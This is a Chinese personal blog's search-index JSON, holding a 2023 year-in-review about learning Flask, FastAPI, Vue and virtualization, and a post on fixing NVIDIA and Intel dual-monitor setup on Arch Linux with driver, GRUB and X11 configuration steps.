[{"categories":["年度总结"],"content":"尽管时间是人类定义的单位，但并不影响它像一条河流般从山坡像平原流逝。感觉只是喘口气，眨一下眼睛，2023年就这么过去了。 回想这些记忆，就像飘在半空中的樱花花瓣，我想踮起脚尖去捕捉，今年也发生了许多。 现在就拾起花瓣看看，也许会让我把时光捡回来呢。 收获 过去的一年也学到了点东西。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:0:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"知识 \u0026 技能 2023 年，我学会了一些技能，并开了几个能看的开源项目，拓宽了一些视野。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"Flask 让我们从 Flask 之旅开始。 很早以前，我就发现自己陷入了 Flask 这个迷人的网络中，这是一个令人愉悦的 Python 网络应用程序框架。 使用 Flask 简单而高效的 MVC 结构设置并完成 TinyGallery 的快感在我的学习道路上留下了不可磨灭的印记。 深入研究 Flask 官方文档后，我发现了借助 jinja2 驱动的模板渲染页面的艺术。这种探索虽然需要耐心，但最终取得了成果，因为我逐渐在项目中加入了一些功能–除了上传文件的要求。 @app.route(\"/\") def index(): database = db.get_db() ImageTable = database.execute(\"SELECT * FROM IMAGES ORDER BY Date DESC\") if 'username' in session: LikeTable = database.execute(\"SELECT LikedPostUUID FROM ImagesLikedByUser WHERE User = ? AND LikeStatus = ?\", (session['username'], 1, )).fetchall() LikedList = [] for i in LikeTable: LikedList.append(str(i[0])) Avatar = database.execute('SELECT Avatar FROM AVATARS WHERE UserName = ?', (session['username'],)).fetchone() userAvaterImage = app.config['PUBLIC_USERFILES'] + '/' + session['username'] + '/' + Avatar['Avatar'] return render_template( \"index.html\", PageTitle=\"HomePage\", Images=ImageTable, userAvaterImage=userAvaterImage, userName=session['username'], LikedList=LikedList) else: return render_template(\"index.html\", PageTitle=\"HomePage\", Images=ImageTable) {% extends \"base.html\" %} {% block Title %} {{PageTitle}} | TinyGallery {% endblock %} {% block body %} \u003cdiv class=\"Content\"\u003e {% for x in Images %} \u003cdiv class=\"work\"\u003e \u003cimg class=\"displayedImages\" onclick=\"OpenFullImage({{ loop[\" index\"] }})\" src=\"/static/img/users/{{ x['User'] }}/Images/{{ x['UUID'] }}.jpg\" alt=\"{{ x['UUID'] }}\" /\u003e \u003ch1 class=\"userName\"\u003e{{ x['ImageTitle'] }}\u003c/h1\u003e \u003cp class=\"textFont\"\u003e \u003cspan\u003eBy {{ x['User'] }}\u003c/span\u003e \u003cbr /\u003e \u003cspan class=\"LikesNum\"\u003e Likes: {{ x['Dots'] }} \u003c/span\u003e \u003cbr /\u003e \u003cspan\u003eDescription: {{ x['Description'] }}\u003c/span\u003e \u003cbr /\u003e \u003cspan\u003eDate: {{x['Date']}}\u003c/span\u003e \u003cbr /\u003e {% if g.user %} {% if x['UUID'] in LikedList %} \u003csvg onclick=\"SendLikedData({{ loop[\" index\"] }}, 'Like' )\" class=\"likeStatus0\" style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" fill=\"currentColor\" class=\"bi bi-star\" viewBox=\"0 0 16 16\"\u003e \u003cpath d=\"M2.866 14.85c-.078.444.36.791.746.593l4.39-2.256 4.389 2.256c.386.198.824-.149.746-.592l-.83-4.73 3.522-3.356c.33-.314.16-.888-.282-.95l-4.898-.696L8.465.792a.513.513 0 0 0-.927 0L5.354 5.12l-4.898.696c-.441.062-.612.636-.283.95l3.523 3.356-.83 4.73zm4.905-2.767-3.686 1.894.694-3.957a.565.565 0 0 0-.163-.505L1.71 6.745l4.052-.576a.525.525 0 0 0 .393-.288L8 2.223l1.847 3.658a.525.525 0 0 0 .393.288l4.052.575-2.906 2.77a.565.565 0 0 0-.163.506l.694 3.957-3.686-1.894a.503.503 0 0 0-.461 0z\" /\u003e \u003c/svg\u003e \u003csvg onclick=\"SendLikedData({{ loop[\" index\"] }}, 'Unlike' )\" class=\"likeStatus1\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" fill=\"currentColor\" class=\"bi bi-star-fill\" viewBox=\"0 0 16 16\"\u003e \u003cpath d=\"M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.39.927 0l2.184 4.327 4.898.696c.441.062.612.636.282.95l-3.522 3.356.83 4.73c.078.443-.36.79-.746.592L8 13.187l-4.389 2.256z\" /\u003e \u003c/svg\u003e {% else %} \u003csvg onclick=\"SendLikedData({{ loop[\" index\"] }}, 'Like' )\" class=\"likeStatus0\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" fill=\"currentColor\" class=\"bi bi-star\" viewBox=\"0 0 16 16\"\u003e \u003cpath d=\"M2.866 14.85c-.078.444.36.791.746.593l4.39-2.256 4.389 2.256c.386.198.824-.149.746-.592l-.83-4.73 3.522-3.356c.33-.314.16-.888-.282-.95l-4.898-.696L8.465.792a.513.513 0 0 0-.927 0L5.354 5.12l-4.898.696c-.441.062-.612.636-.283.95l3.523 3.356-.83 4.73zm4.905-2.767-3.686 1.894.694-3.957a.565.565 0 0 0-.163-.505L1.71 6.745l4.052-.576a.525.525 0 0 0 .393-.288L8 2.223l1.847 3.658a.525.525 0 0 0 .393.288l4.052.575-2.906 2.77a.565.565 0 0 0-.163.506l.694 3.957-3.686-1.894a.503.503 0 0 0-.461 0z\" /\u003e \u003c/svg\u003e \u003csvg onclick=\"SendLikedData({{ loop[\" index\"] }}, 'Unlike' )\" class=\"likeStatus1\" style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" fill=\"currentColor\" class=\"bi bi-star-fill\" viewBox=\"0 0 16 16\"\u003e \u003cpath d=\"M3.612 15.443c-.386.198-.824-.149-.746-.592l.83-4.73L.173 6.765c-.329-.314-.158-.888.283-.95l4.898-.696L7.538.792c.197-.39.73-.3","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:1","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"FastAPI、VueJS 进入FastAPI和VueJS。为了提升 TinyGallery 的体验，我们决定将后端和前端分开，重点利用 Ajax-all-in 和 Restful API 功能。这种强烈的追求让我沉浸在 VueJS 的世界中，并最终创建了 tinygallery-vue 和 tinygallery-backend 。经过几个月的潜心学习，最终成功完成了这项工作。 在此期间，我学习的深度和广度都很可观，包括使用 FastAPI 创建一个 Restful API 提供程序，使用 axios 制作一个能够与服务器进行无缝数据通信的网页，以及使用 VueJS 精心设计简单而优雅的组件。 async fetchData() { // Fetch more image data from the server this.pages = this.pages + 1; // Increment the current page number const response = await axios.get(\"/resources/posts/\" + this.pages); // Make a GET request to the server API const newData = JSON.parse(response.request.response); // Parse the response text to JSON format if (newData[0] == null) { // If there is no new data this.pages = this.pages - 1; // Decrement the current page number } else { // Otherwise for (let i = 0; i \u003c newData.length; i++) { // Loop over the new data and add it to the display data array (this.displayData as any).push(newData[i]); } } }, \u003ctemplate\u003e \u003cdiv class=\"Card\" v-for=\"items of displayData\"\u003e \u003cimg @click=\"OpenRemarkBySingleUUID((items as any).post_uuid)\" class=\"displayImage_NSFW\" :src=\"(items as any).cover_url\" :alt=\"(items as any).post_uuid\" v-if=\"(items as any).nsfw\" /\u003e \u003cimg @click=\"OpenRemarkBySingleUUID((items as any).post_uuid)\" class=\"displayImage\" :src=\"(items as any).cover_url\" :alt=\"(items as any).post_uuid\" v-else /\u003e \u003ch2 class=\"ImageTitle\"\u003e{{ (items as any).post_title }}\u003c/h2\u003e \u003cp class=\"ImageDescription\"\u003e{{ (items as any).description }}\u003c/p\u003e \u003cdiv class=\"UserInfoBar\"\u003e \u003cimg class=\"UserAvatar\" :src=\"(items as any).avatar\" /\u003e \u003cp class=\"ImageUserName\"\u003e{{ (items as any).user_name }}\u003c/p\u003e \u003cp class=\"LikesDisplay\"\u003e{{ (items as any).dots }} likes\u003c/p\u003e \u003cp class=\"ImageDate\"\u003e {{ TimeZoneCaculator.CaculateTheCorrectDate((items as any).date) }} \u003c/p\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e @image_resources_api.get(\"/posts/{page}\") async def get_posts_as_json(page: int, db: Session = Depends(get_db)): if not page: raise HTTPException( status_code=400, detail=\"You must append a page number to the end of the url.\") posts_from_db = crud.get_posts_by_page(db=db, page=page) list_for_return: list[dict] = [] for x in posts_from_db: user_uuid = get_user_uuid_by_name(user_name=x.user_name, db=db) admin_uuid = get_admin_uuid_by_name(user_name=x.user_name, db=db) temp_dict = { \"id\": x.id, \"description\": x.description, \"share_num\": x.share_num, \"post_uuid\": x.post_uuid, \"nsfw\": x.nsfw, \"user_name\": x.user_name, \"post_title\": x.post_title, \"dots\": x.dots, \"date\": x.date[0:16], \"cover_url\": dir_tool.get_cover_file_url(x.post_uuid), \"avatar\": dir_tool.get_avatar_file_url(dir_user_uuid=admin_uuid if admin_uuid else user_uuid)[1] } list_for_return.append(temp_dict) return list_for_return 我沉浸在新技能带来的满足感中，得意洋洋地浏览了 VueJS 的选项 API，熟悉了生命周期管理、组件和道具的复杂性。在后端方面，我掌握了用于身份验证、文件处理和数据操作的 JWT 令牌创建技术，进一步增强了我的能力。 LoginAccount() { if (this.logUserName == \"\" || this.logPassWord == \"\") { // Check if username and password are empty this.Result = \"Username or password can't be empty!\"; console.log(\"Username or password can't be empty!\"); } else { let bodyFormData = new FormData(); bodyFormData.append(\"username\", this.logUserName); bodyFormData.append(\"password\", this.logPassWord); axios({method: \"post\", url: \"/user/token\", data: bodyFormData, headers: { \"Content-Type\": \"application/x-www-form-urlencoded\" },}) .then((response: any) =\u003e { console.log(response.data.access_token); // Create an object to store the username and token. const token = response.data.access_token; window.localStorage.setItem(\"Token\", token); // Set logging status. Authentication().setLogStatus(true); }) .catch((error: any) =\u003e { // Return the errors. this.Result = error.response.data.detail; console.log(error.response.data.detail); }); } }, @userAuthRouter.post(\"/token\") async def user_login(db: Session = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()): user_authentication = authenticate_user(db, form_data.username, form_data.password) admin_authentication = authenticate_admin(db, form_data.username, form_data.password","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:2","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"pandas 学习 pandas 改变了我的生活。这个建立在 Python 基础上的开源数据分析和处理工具用途广泛，速度快如闪电，已被证明是我执行数据相关任务时不可或缺的资产。 无论是清理数据集，还是深入研究综合数据分析，pandas 始终是我的得力助手。 一个有趣的方面是，它能够毫不费力地处理通过蜘蛛脚本获取的数据，使数据易于访问和读取，以便进一步处理。 此外，在清理操作之后，我还能迅速将新数据生成 Excel 或 CSV 文件，这一点简直太神奇了。 不过，我必须承认，要掌握这个强大的工具，需要学习和实践的地方还很多。经验才是真正的老师，不是吗？ ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:3","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"pyecharts 现在，让我们来谈谈 pyecharts。当我需要从我的数据中绘制出令人惊叹的图片或图表并将其显示在网页上时，pyecharts 就成了我的首选解决方案。 当然，我也知道 Apache ECharts 是一个开源的 JavaScript 可视化库，但设置其属性和渲染复杂的图表可能是一项相当繁重的工作。这时，pyecharts 的出现拯救了我，帮我避开了复杂的问题，简化了流程。 官方文档提供了大量创建简单数据图表和图形的示例，绝对是我的救星。当我只需要一个快速、简单的图表时，依靠 pyecharts 绝对是轻而易举的事。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:4","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"数据库 在掌握了 SQL 并熟悉了 MySQL、MariaDB 和 SQLite 之后，我发现它们在满足各种开发需求方面各有千秋。 SQLite 说到轻量级、基于文件的管理和丰富内容的轻松传输，SQLite 一直是我在简单应用中的首选。SQLite 数据库文件通常用于内容传输和长期数据存档，这表明它具有多功能性，可广泛应用于各种场景。事实上，你知道目前有超过 1 万亿（1e12）个活跃的 SQLite 数据库在使用吗？这真是令人难以置信！SQLite 的灵活性和易用性使其成为 TinyGallery 等项目的理想解决方案，在这些项目中，它是可靠的数据库引擎。 MySQL \u0026 MariaDB 当然，在性能是重中之重的情况下，尤其是在大型应用中，MySQL 或其分叉产品 MariaDB 的稳健性往往变得至关重要。它们在业界的良好声誉以及处理更大数据集和更高负载的能力使它们成为开发社区的热门选择。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:5","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"虚拟化 进入云计算这个令人着迷的领域，不仅拓宽了我对现代技术的理解，还激发了我对虚拟化–云基础设施的基石–的浓厚兴趣。 在这一领域，我有幸熟悉了各种虚拟化软件，提高了我对资源管理和系统协调的理解。让我们深入了解每种著名工具的具体内容： VMware Workstation 在我的虚拟化探索中，VMware Workstation处于最前沿。它在单个物理设备上运行多个虚拟机的强大环境，对完善我的系统管理和资源分配方法起到了重要作用。 VMware Workstation 丰富的功能集和友好的用户界面使我能够以无与伦比的轻松和高效创建和管理虚拟环境，在我的数字基础架构管理之旅中留下了不可磨灭的印记。 VirtualBox 随着我的深入研究，VirtualBox凭借其开源精神，成为一个引人注目的替代方案，重塑了我对虚拟化的可访问性和简易性的看法。它无缝创建和管理虚拟机的能力不仅拓宽了我的技术能力，还使虚拟化体验民主化，让不同的爱好者和专业人士都能使用虚拟化。 VirtualBox 的包容性和用户友好性凸显了提供易于使用的虚拟化工具对于帮助更多有抱负的开发人员和云计算爱好者的重要意义。 Qemu/KVM 在我的虚拟化之旅中，QEMU/KVM 的强强联手一直是一股强大的力量，它囊括了管理程序功能和 Linux 系统硬件辅助虚拟化的原始力量。 这对充满活力的组合所提供的无缝兼容性和强大性能，为管理虚拟化环境的敏捷性和效率开辟了新的空间，并激发了我对底层虚拟化技术复杂性的新认识。 使用 QEMU/KVM 不仅增强了我的技术实力，还丰富了我对系统级虚拟化的理解，改变了我管理数字基础设施的方法。 Libvirt 最后但并非最不重要的是，libvirt是一个通用的开源工具包，在我探索虚拟化技术的过程中成为我的忠实伙伴。 它对 QEMU/KVM、Xen 和 LXC 等一系列管理程序的广泛支持简化了虚拟化平台的协调和管理，为虚拟化功能和基础设施管理提供了一个整体视角。 我与 libvirt 的合作历程凸显了适应性强、功能多样的虚拟化工具在现代社会的重要作用，重新定义了基础架构管理和资源优化的范式。 这些虚拟化技术具有多种功能和应用，不仅加深了我在云计算方面的专业知识，还拓宽了我的视野，让我对高效资源利用和基础设施协调有了细致入微的了解。 虚拟化之旅是一次不折不扣的变革，为驾驭云基础设施和数字环境的动态景观奠定了坚实的基础。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:6","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"Docker 拥抱Docker的世界是一次变革之旅，它重新定义了我对待软件开发和部署的方式。从潜心研究Docker的创新容器化方法，到挖掘其创建轻量级、可移植和自给自足环境的潜力，我的探索过程令人振奋。 去年，我撰写了一篇[文章]（/zh-cn/posts/浅尝docker/），揭示了使用Docker的这一历程。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:7","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"OpenStack 最近，我开始涉足OpenStack领域，为云计算基础设施管理打开了一扇潜力巨大的大门。 虽然我目前只是在一台 Linux 服务器上进行了安装，但我已经准备好开始一段丰富的学习之旅，揭开 OpenStack 功能的神秘面纱。 这次旅程已经彰显了 OpenStack 在重塑可扩展和可定制云环境动态方面的威力，我期待着在进一步深入研究其功能和应用时记录下我的发现。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:1:8","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"新设备 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"108 客制化键盘 极地狐狸轴用于字母区，午夜翡翠轴用于大按键，BOX白色轴用于其他按键。 支持三模式和 RGB 我购买这款键盘是为了获得更好的打字体验、更好的外观和游戏体验。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:1","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"87 客制化键盘 空格键采用蓝莓冰淇淋轴，其他按键采用灰木 V4 轴 仅限单模式，白色背光 我购买这款键盘是为了编程和尝试不同的键入体验。 另外，它的轻巧总是能帮我取代学校计算机教室里的薄膜键盘。 没有状态良好的键盘… 大多数键盘都因为学生上课无聊而出现不同程度的损坏 甚至还有键帽被抠掉的… 那我得自己带键盘去上实验课了。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:2","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"ViewSonic 显示器 23.8 英寸，1080P，165Hz，Fast-IPS 面板，支持 HDR10 我在开学时买了它，起初以为在大屏幕上可以阅读更多行代码… ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:3","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"华硕路由器AX-56U 不知道什么疯买的华硕路由器，支持双频WiFi6，千兆有线，没刷系统，还在用官方固件，目前在家里当AP用。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:4","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"从 muki 那里收的小主机 其实它的来历有故事，但我说过不好的回忆没有任何意义。R5-1400+RX580，8GB RAM，目前放在家作为 Me0w00f Technology 团队的内部服务器使用。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:5","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"Pixel 3XL 某只狐狸捐赠的墙外机，用于墙外社交、有时候看 YouTube 、安装了 DOL。 也没有进行刷机，仍然是 Pixel 官方原生系统摆烂。 遗憾 然而，不可能总是一帆风顺。 无法实现和完成的事情是一种遗憾。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:2:6","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"比赛 首先，也是最大的遗憾是，今年我没能有机会参加大型比赛。 虽然我进行了训练和准备，学习了很多… ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:3:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"技能、作品和游戏。 此外……一些技能细节和基本知识还没有掌握。 遗憾的是，我也没有享受到美好的游戏时光… ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:4:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"抑郁 一切糟糕的事情都来自可怕的原因，我可能在情绪上生病了，比如抑郁症。 我知道有必要去看医生，但机会很少。 我想摆脱它，但这很难。 它就像一块石头，很可能也肯定会阻碍我前进的脚步…… 新友 以下是我今年新认识的朋友和他们说的话。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:5:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"GrassBlock “新的一年希望狗子能够开心的活着，不要把自己想的太低而给自己压力。” ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:6:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"Riiina “看医生。” ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:7:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["年度总结"],"content":"Epsoide33 “你啊 还是考虑下怎么好好活着吧,至少在我看来你是挺有前景的。” 2024 年的计划 完成 《Computer Systems A Programmer’s Perspective》 一书的阅读。 学习使用 Vuetify 或 PrimeVue。 学习更多有关虚拟化、编程和网络的知识。 准备专升本。 参加一次比赛。 找到对象(还是算了吧) 结语 终于，我记录下了这一年。即使有失败的遗憾，我还是收获了很多，以至于在年末时从不感到悲伤。 ","date":"2023-12-31","objectID":"/zh-cn/posts/2023-annual-summary/:8:0","tags":["年度总结","思考","总结","生活"],"title":"2023 年度总结","uri":"/zh-cn/posts/2023-annual-summary/"},{"categories":["问题解决"],"content":"几个礼拜前，我买了个优派的新显示器","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"序 最近买了个优派的新显示器，但是我遇到了多显卡问题。过去一年我都是用笔记本自带的显示器跑 Gnome, 没有装 N 卡闭源驱动。 然而，因为买了新显示器，用核显来带两个屏幕，显然性能不够。 因此，我打算在我的 Arch 给这张 3050 装闭源驱动，用来带新的显示器。但是过程并不是很顺利…… 我踩坑的原因是我之前习惯用 wayland 模式来跑 Gnome 的，但据说 N 卡的闭源驱动在 wayland 表现不太好？ 所以这意味着我必须放弃用 wayland 来带两个屏幕，这太糟糕了，我不得不回到 X11 的怀抱了。 ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:1:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"起步 最开始呢，我直接把显示器插在了笔记本上的 mini-DP 口，另一头插在显示器的 DP 口上。 但失望的是，它根本没有亮起来。 QAQ 也许是这个 miniDP 口在缺少N卡驱动的情况下不能输出。 所以我打算把它装上。 ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:2:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"安装 N 卡驱动 第一步是安装驱动，但需要注意的是，这是第一步，而不是万事大吉。 $ sudo pacman -S nvidia nvidia-utils lib32-nvidia-utils nvidia-prime 然而，这显示器仍然没有亮… 于是我到 ArchCN 群问大佬。 经过讨论之后，我得到了解决问题的方法。 ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:3:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"打开 ibt 大概在三月份的时候，我遇到了一些 VirtualBox 的问题。 但是现在不需要关掉了，所以我需要把它从内核参数当中移除。 编辑文件：/etc/default/grub $ sudo vim /etc/default/grub GRUB_DEFAULT=\"0\" GRUB_TIMEOUT=\"100\" GRUB_DISTRIBUTOR=\"Arch\" GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0\" GRUB_CMDLINE_LINUX=\"ibt=off\" ......... 然后将 ibt=off 从 GRUB_CMD_LINE_LINUX 当中删除： GRUB_DEFAULT=\"0\" GRUB_TIMEOUT=\"100\" GRUB_DISTRIBUTOR=\"Arch\" GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0\" GRUB_CMDLINE_LINUX=\"\" ......... 然后重新生成 grub.cfg 配置文件 $ sudo grub-mkconfig -o /etc/grub/grub.cfg ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:4:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"设置 NVIDIA modeset 然后我需要查看 nvidia-drm.modeset 的值。 $ cat /sys/module/nvidia_drm/parameters/modeset 它返回的结果： N 现在我需要向内核参数添加 nvidia-drm.modeset=1 。 ChatGPT 的解释 nvidia-drm.modeset=1内核参数启用了NVIDIA Direct Rendering Manager KMS（内核模式设置）。KMS是一种在内核空间而非用户空间设置显示分辨率和深度的方法。 编辑文件：/etc/default/grub $ sudo vim /etc/default/grub 向 GRUB_CMDLINE_LINUX_DEFAULT 添加 nvidia-drm.modeset=1 。 ........ GRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0 nvidia-drm.modeset=1\" ........ 然后重新生成 grub 配置文件。 $ sudo grub-mkconfig -o /boot/grub/grub.cfg 然后重启。 ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:5:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"使用 mutter-performance 然而，在重启之后效果还是不太好。 ChatGPT 的解释 mutter-performance “是 Mutter 窗口管理器的优化版本，特别针对性能进行了调整。Mutter 是 GNOME 3 的默认窗口管理器，负责窗口的排列、交互和动画linkedin.com。 这个包需要从 AUR 安装. $ paru -S mutter-performance 装完之后，桌面确实比之前要快一点了，但仍然不够。 并且，值得一提的是，现在是时候卸载 xf86-video-intel 了。 在新设备当中并不需要这个包。 $ sudo pacman -Rs xf86-video-intel ChatGPT 的解释 xf86-video-intel 软件包是 Intel 集成显卡芯片的驱动程序，由 X.Org 项目维护。 然而，对于现代 Intel 图形硬件（大约 2007 年及更新版本），出于以下几个原因，通常建议删除此软件包： 更好地支持模式设置驱动程序：模式设置驱动程序是 X 服务器的一部分，不需要单独安装，可以更好地支持现代图形功能和硬件。 它由 X.Org 项目维护，并倾向于跟上图形技术 github.com 的新发展。 xf86-video-intel 驱动程序的问题：已知 xf86-video-intel 驱动程序会在某些系统上引起问题，包括图形故障以及与模式设置驱动程序相比性能较差。 在某些情况下，它甚至会导致 bbs.archlinux.org 系统不稳定。 缺乏积极的开发：xf86-video-intel 驱动程序已经好几年没有积极开发了，这意味着它可能缺乏对较新硬件和软件中的功能的支持。 另一方面，模式设置驱动程序作为 X 服务器 reddit.com 的一部分正在积极开发。 要删除 xf86-video-intel 软件包，您可以使用特定 Linux 发行版的软件包管理器。 以下是使用 pacman（Arch Linux 的包管理器）的示例： sudo pacman -R xf86-video-intel 删除软件包后，重新启动系统以确保更改生效。 请记住检查特定发行版的文档，了解删除软件包和处理驱动程序的正确方法。 ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:6:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"设置 X11 配置文件 根据 Arch Wiki，我需要设置一些 X11 配置文件，用来单独使用 N 卡。 写入文件 /etc/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf/： Section \"OutputClass\" Identifier \"intel\" MatchDriver \"i915\" Driver \"modesetting\" EndSection Section \"OutputClass\" Identifier \"nvidia\" MatchDriver \"nvidia-drm\" Driver \"nvidia\" Option \"AllowEmptyInitialConfiguration\" Option \"PrimaryGPU\" \"yes\" ModulePath \"/usr/lib/nvidia/xorg\" ModulePath \"/usr/lib/xorg/modules\" EndSection 然后我就需要创建两个 